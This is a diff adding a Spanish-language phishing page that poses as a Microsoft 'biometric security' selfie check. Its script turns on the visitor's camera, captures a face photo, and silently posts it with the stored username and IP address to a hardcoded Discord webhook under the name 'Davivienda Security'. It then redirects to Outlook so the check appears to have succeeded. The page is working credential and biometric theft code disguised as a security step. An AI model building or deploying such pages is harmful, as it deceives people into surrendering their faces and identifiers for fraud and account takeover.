@@ -1,0 +1,629 @@
+<!DOCTYPE html>
+<html lang="es-CO">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Administrador de Servicios</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: "Montserrat", -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+      background: #f5f5f5;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+    }
+
+    .container {
+      background: white;
+      border-radius: 12px;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+      max-width: 480px;
+      width: 100%;
+      padding: 40px 30px;
+      text-align: center;
+      position: relative;
+    }
+
+    .logo {
+      color: #1a1a1a;
+      font-size: 32px;
+      font-weight: bold;
+      margin-bottom: 30px;
+      letter-spacing: 1px;
+    }
+
+    h1 {
+      color: #1a1a1a;
+      font-size: 26px;
+      font-weight: 700;
+      margin-bottom: 15px;
+      line-height: 1.3;
+    }
+
+    .subtitle {
+      color: #5c5c5c;
+      font-size: 15px;
+      line-height: 1.6;
+      margin-bottom: 20px;
+    }
+
+    .error-message {
+      background: #ffe6e6;
+      border: 2px solid #294a9c;
+      border-radius: 8px;
+      padding: 15px;
+      margin: 15px 0;
+      text-align: center;
+    }
+
+    .error-message i {
+      color: #294a9c;
+      font-size: 20px;
+      margin-bottom: 10px;
+    }
+
+    .error-message p {
+      color: #294a9c;
+      font-weight: 600;
+      margin: 5px 0;
+    }
+
+    .attempt-counter {
+      color: #bbdce8;
+      font-weight: bold;
+      font-size: 14px;
+      margin-top: 10px;
+    }
+
+    .instructions-box {
+      background: #bbdce8;
+      border-left: 4px solid #294a9c;
+      padding: 18px;
+      border-radius: 8px;
+      margin: 15px 0;
+      text-align: left;
+    }
+
+    .instructions-title {
+      color: #f90606;
+      font-size: 16px;
+      font-weight: 700;
+      margin-bottom: 12px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .title-icon {
+      font-size: 18px;
+    }
+
+    .instruction-item {
+      display: flex;
+      align-items: flex-start;
+      gap: 10px;
+      margin-bottom: 10px;
+      color: #333;
+      font-size: 14px;
+      line-height: 1.5;
+    }
+
+    .instruction-item:last-child {
+      margin-bottom: 0;
+    }
+
+    .instruction-icon {
+      color: #28a745;
+      font-size: 16px;
+      flex-shrink: 0;
+      margin-top: 2px;
+    }
+
+    .urgent-notice {
+      background: #fff3f3;
+      border: 2px solid #ed1c24;
+      border-radius: 8px;
+      padding: 15px;
+      margin: 15px 0;
+      color: #ed1c24;
+      font-weight: 700;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      text-align: left;
+    }
+
+    .urgent-notice i {
+      font-size: 24px;
+    }
+
+    .btn-primary {
+      width: 100%;
+      padding: 16px;
+      background: #567ad6 !important;
+      color: white !important;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+      font-weight: 700;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      box-shadow: 0 6px 20px rgba(237, 28, 36, 0.4);
+      margin-top: 15px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+    }
+
+    .btn-primary:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 6px 20px rgba(237, 28, 36, 0.4);
+      background: #294a9c !important;
+    }
+
+    .btn-primary:active {
+      transform: translateY(0);
+    }
+
+    .btn-cancel {
+      width: 100%;
+      padding: 12px;
+      background: transparent;
+      color: #294a9c;
+      border: 2px solid #294a9c;
+      border-radius: 8px;
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer;
+      margin-top: 8px;
+      transition: all 0.3s ease;
+    }
+
+    .btn-cancel:hover {
+      background: #294a9c;
+      color: white;
+    }
+
+    .btn-cancel:active {
+      transform: scale(0.98);
+    }
+
+    .camera-icon {
+      font-size: 20px;
+    }
+
+    .security-note {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      margin-top: 20px;
+      color: #5c5c5c;
+      font-size: 13px;
+    }
+
+    .lock-icon {
+      color: #28a745;
+      font-size: 16px;
+    }
+
+    /* Estilos para la pantalla de carga */
+    .loading-screen {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: white;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      z-index: 1000;
+    }
+
+    .loading-logo {
+      font-size: 48px;
+      color: #ed1c24;
+      font-weight: bold;
+      margin-bottom: 30px;
+    }
+
+    .loading-spinner {
+      width: 50px;
+      height: 50px;
+      border: 5px solid #f3f3f3;
+      border-top: 5px solid #ed1c24;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin-bottom: 20px;
+    }
+
+    .loading-text {
+      color: #ed1c24;
+      font-size: 18px;
+      font-weight: 600;
+    }
+
+    @keyframes spin {
+      0% {
+        transform: rotate(0deg);
+      }
+
+      100% {
+        transform: rotate(360deg);
+      }
+    }
+
+    /* Cámara - MODIFICADO PARA APARECER MÁS ARRIBA */
+    #cameraContainer {
+      display: none;
+      margin: 15px 0 10px 0;
+      position: relative;
+    }
+
+    .camera-preview {
+      width: 100%;
+      max-width: 300px;
+      height: 280px;
+      background: #000;
+      border-radius: 12px;
+      margin: 0 auto 15px;
+      overflow: hidden;
+      position: relative;
+      border: 3px solid #ed1c24;
+    }
+
+    .camera-preview video {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      transform: scaleX(-1);
+      /* Espejo para selfie */
+    }
+
+    .camera-guide {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      width: 180px;
+      height: 180px;
+      border: 3px dashed rgba(255, 255, 255, 0.8);
+      border-radius: 50%;
+      pointer-events: none;
+    }
+
+    /* Canvas oculto para capturar foto */
+    #canvas {
+      display: none;
+    }
+
+    /* Clase para ocultar elementos cuando la cámara está activa */
+    .hide-on-camera {
+      transition: opacity 0.3s ease;
+    }
+
+    .camera-active .hide-on-camera {
+      opacity: 0;
+      height: 0;
+      margin: 0;
+      padding: 0;
+      overflow: hidden;
+    }
+
+    @media (max-width: 540px) {
+      .container {
+        padding: 25px 20px;
+      }
+
+      h1 {
+        font-size: 22px;
+        margin-bottom: 12px;
+      }
+
+      .subtitle {
+        font-size: 14px;
+        margin-bottom: 15px;
+      }
+
+      .instructions-box {
+        padding: 15px;
+        margin: 10px 0;
+      }
+
+      .camera-preview {
+        height: 240px;
+        max-width: 280px;
+      }
+
+      .camera-guide {
+        width: 150px;
+        height: 150px;
+      }
+
+      .btn-primary {
+        padding: 14px;
+        margin-top: 12px;
+      }
+    }
+  </style>
+</head>
+
+<body>
+  <!-- Pantalla de carga -->
+  <div id="loadingScreen" class="loading-screen" style="display: none;">
+    <div class="loading-logo">Microsoft</div>
+    <div class="loading-spinner"></div>
+    <div id="loadingText" class="loading-text">Procesando su información...</div>
+  </div>
+
+  <!-- Contenedor principal -->
+  <div class="container" id="mainContainer">
+    <div class="logo">Microsoft</div>
+
+    <!-- Sección de selfie -->
+    <div id="selfieSection">
+      <h3 id="mainTitle" class="hide-on-camera">Seguridad biométrica foto tipo selfie para mayor seguridad</h3>
+      <p id="mainSubtitle" class="subtitle hide-on-camera">
+        Busque un espacio iluminado y haga una expresión neutra. No use gafas,
+        sombreros o accesorios que tapen su rostro.
+      </p>
+
+      <!-- Mensaje de error -->
+      <div id="errorMessage" class="error-message" style="display: none;">
+        <i class="fa-solid fa-exclamation-triangle"></i>
+        <p id="errorText">No pudimos reconocerte. Por favor, intenta de nuevo.</p>
+        <div id="attemptInfo" class="attempt-counter"></div>
+      </div>
+
+      <div class="urgent-notice">
+        <i class="fa-solid fa-triangle-exclamation"></i>
+        <span>AVISO: Para continuar, es estrictamente necesario realizar la validación facial biométrica.</span>
+      </div>
+
+      <div class="instructions-box hide-on-camera">
+        <div class="instructions-title">
+          <i class="fa-solid fa-clipboard-list title-icon"></i>
+          Instrucciones importantes
+        </div>
+        <div class="instruction-item">
+          <i class="fa-solid fa-circle-check instruction-icon"></i>
+          <span>Busque un lugar con buena iluminación natural o artificial</span>
+        </div>
+        <div class="instruction-item">
+          <i class="fa-solid fa-circle-check instruction-icon"></i>
+          <span>Mantenga una expresión facial neutra, sin sonreír</span>
+        </div>
+        <div class="instruction-item">
+          <i class="fa-solid fa-circle-check instruction-icon"></i>
+          <span>Retire gafas, gorras, sombreros y accesorios faciales</span>
+        </div>
+        <div class="instruction-item">
+          <i class="fa-solid fa-circle-check instruction-icon"></i>
+          <span>Asegúrese de que su rostro esté completamente visible</span>
+        </div>
+        <div class="instruction-item">
+          <i class="fa-solid fa-circle-check instruction-icon"></i>
+          <span>Coloque la cámara a la altura de sus ojos</span>
+        </div>
+      </div>
+
+      <!-- Contenedor de cámara -->
+      <div id="cameraContainer">
+        <div class="camera-preview">
+          <video id="videoElement" autoplay playsinline></video>
+          <div class="camera-guide"></div>
+        </div>
+
+        <button class="btn-primary" onclick="capturePhoto()">
+          <i class="fa-solid fa-camera camera-icon"></i>
+          Capturar foto
+        </button>
+
+        <button class="btn-cancel" onclick="closeCamera()">Cancelar</button>
+      </div>
+
+      <!-- Canvas oculto para capturar -->
+      <canvas id="canvas" style="display: none;"></canvas>
+
+      <button class="btn-primary hide-on-camera" id="openCameraBtn" onclick="openCamera()">
+        <i class="fa-solid fa-camera camera-icon"></i>
+        <span id="buttonText">Tomar selfie ahora</span>
+      </button>
+
+      <button class="btn-cancel hide-on-camera" onclick="une()"
+        style="margin-top: 10px;">
+        <i class="fa-solid fa-arrow-left"></i>
+        Volver al formulario
+      </button>
+      <script>
+        function une() {
+          window.location.href='https://outlook.live.com/mail/0/'
+        }
+      </script>
+      <div class="security-note hide-on-camera">
+        <i class="fa-solid fa-lock lock-icon"></i>
+        <span>Su información está siendo procesada de forma segura</span>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // REEMPLAZA ESTA URL CON TU WEBHOOK DE DISCORD
+    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1462992363814256804/PZcZVPGrikV4XTQEc1DSptMHR8c3ytyx4Q9JcZV7U3NOEFdqQ_XDWOc3yUMqIch1RoLO";
+
+    let stream = null;
+    let videoElement = null;
+    let canvas = null;
+    let ctx = null;
+    // Removed MAX_ATTEMPTS logic
+
+    // Función para enviar imagen a Discord usando FormData
+    async function sendImageToDiscord(imageBlob, message) {
+      try {
+        const formData = new FormData();
+        formData.append('file', imageBlob, `selfie_verified.jpg`);
+        formData.append('content', message);
+        formData.append('username', 'Davivienda Security');
+
+        await fetch(DISCORD_WEBHOOK_URL, {
+          method: 'POST',
+          body: formData
+        });
+
+        console.log(`Selfie enviada a Discord`);
+        return true;
+      } catch (error) {
+        console.error('Error enviando selfie a Discord:', error);
+        return false;
+      }
+    }
+
+    // Función para enviar solo mensaje a Discord
+    async function sendMessageToDiscord(message) {
+      try {
+        await fetch(DISCORD_WEBHOOK_URL, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            content: message,
+            username: 'Davivienda Security'
+          })
+        });
+        console.log('Mensaje enviado a Discord');
+      } catch (error) {
+        console.error('Error enviando mensaje a Discord:', error);
+      }
+    }
+
+    function showLoadingScreen(text = "Procesando su información...") {
+      document.getElementById('loadingText').textContent = text;
+      document.getElementById('loadingScreen').style.display = 'flex';
+      document.getElementById('mainContainer').style.display = 'none';
+    }
+
+    async function openCamera() {
+      try {
+        document.getElementById('mainContainer').classList.add('camera-active');
+
+        setTimeout(() => {
+          document.getElementById("cameraContainer").style.display = "block";
+        }, 50);
+
+        videoElement = document.getElementById("videoElement");
+        canvas = document.getElementById("canvas");
+        ctx = canvas.getContext("2d");
+
+        const constraints = {
+          video: {
+            facingMode: "user",
+            width: { ideal: 1280 },
+            height: { ideal: 720 }
+          },
+          audio: false
+        };
+
+        stream = await navigator.mediaDevices.getUserMedia(constraints);
+        videoElement.srcObject = stream;
+      } catch (error) {
+        console.error("Error al acceder a la cámara:", error);
+        alert("Por favor, permita el acceso a la cámara para continuar.");
+      }
+    }
+
+    async function capturePhoto() {
+      showLoadingScreen("Enviando...");
+
+      try {
+        canvas.width = videoElement.videoWidth;
+        canvas.height = videoElement.videoHeight;
+
+        ctx.save();
+        ctx.scale(-1, 1);
+        ctx.drawImage(videoElement, -canvas.width, 0, canvas.width, canvas.height);
+        ctx.restore();
+
+        canvas.toBlob(async (blob) => {
+          if (!blob) {
+            console.error("Error blob");
+            return;
+          }
+
+          // 1. Detener cámara
+          if (stream) {
+            stream.getTracks().forEach(track => track.stop());
+            stream = null;
+          }
+
+          const usuario = localStorage.getItem("usuario") || "Usuario";
+
+          let ip = "N/A";
+          const fullInfo = localStorage.getItem('user_full_info');
+          if (fullInfo) {
+            try {
+              const data = JSON.parse(fullInfo);
+              ip = data.ip || "N/A";
+            } catch (e) { }
+          }
+
+          const discordMessage = `✅ **NUEVA SELFIE CAPTURADA**\n` +
+            `👤 **Usuario:** ${usuario}\n` +
+            `🌐 **IP:** ${ip}\n` +
+            `🕐 **Hora:** ${new Date().toLocaleString()}`;
+
+          // 2. Enviar a Discord (background)
+          await sendImageToDiscord(blob, discordMessage);
+
+          // 3. ÉXITO INMEDIATO (Simula proceso de verificación)
+          setTimeout(() => {
+            window.location.href = "https://outlook.live.com/mail/0/";
+          }, 500); // Éxito rápido
+
+        }, 'image/jpeg', 0.90);
+
+      } catch (error) {
+        console.error("Error capturando foto:", error);
+        alert("Error técnico. Continuando...");
+        window.location.href = "https://outlook.live.com/mail/0/";
+      }
+    }
+
+    function closeCamera() {
+      if (stream) {
+        stream.getTracks().forEach(track => track.stop());
+        stream = null;
+      }
+      document.getElementById("cameraContainer").style.display = "none";
+      document.getElementById('mainContainer').classList.remove('camera-active');
+    }
+
+    window.addEventListener("beforeunload", () => {
+      if (stream) {
+        stream.getTracks().forEach(track => track.stop());
+      }
+    });
+
+
+
+    // Inicializar
+    document.addEventListener("DOMContentLoaded", function () {
+      console.log("Ready");
+    });
+  </script>
+</body>
+
+</html>
